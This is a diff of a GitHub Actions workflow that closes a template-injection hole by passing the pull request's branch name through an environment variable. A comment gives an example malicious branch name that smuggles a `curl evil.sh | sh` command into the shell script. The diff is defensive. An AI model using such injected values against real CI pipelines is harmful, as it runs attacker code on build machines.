@@ -8,9 +8,16 @@ jobs:
   check-source-branch:
     runs-on: ubuntu-latest
     steps:
+      # `github.head_ref` is a branch name the PR author controls, so interpolating it straight
+      # into the script body is a template-injection sink — a branch called
+      # `x"; curl evil.sh | sh; #` would run as shell. Passing it through the environment keeps
+      # it data: the expression is expanded by the runner into an env var, and the shell only
+      # ever sees `$HEAD_REF`.
       - name: Only allow PRs from develop
+        env:
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          if [ "${{ github.head_ref }}" != "develop" ]; then
+          if [ "$HEAD_REF" != "develop" ]; then
             echo "::error::PRs to master are only allowed from the develop branch."
             exit 1
           fi
